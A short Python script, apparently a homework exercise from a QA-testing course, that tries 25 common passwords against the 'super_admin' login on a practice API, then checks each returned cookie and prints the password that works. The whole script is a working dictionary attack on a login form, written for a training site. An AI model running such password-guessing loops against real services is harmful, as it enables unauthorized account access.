import requests

top_password = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"}

for x in top_password:
    payload = {"login": "super_admin", "password": x}
    response = requests.post("https://playground.learnqa.ru/api/get_secret_password_homework", data=payload)
    answer = dict(response.cookies)

    response_check = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=answer)
    if response_check.text == "You are authorized":
        print(f"Пароль: {x} c ответом {response_check.text}")


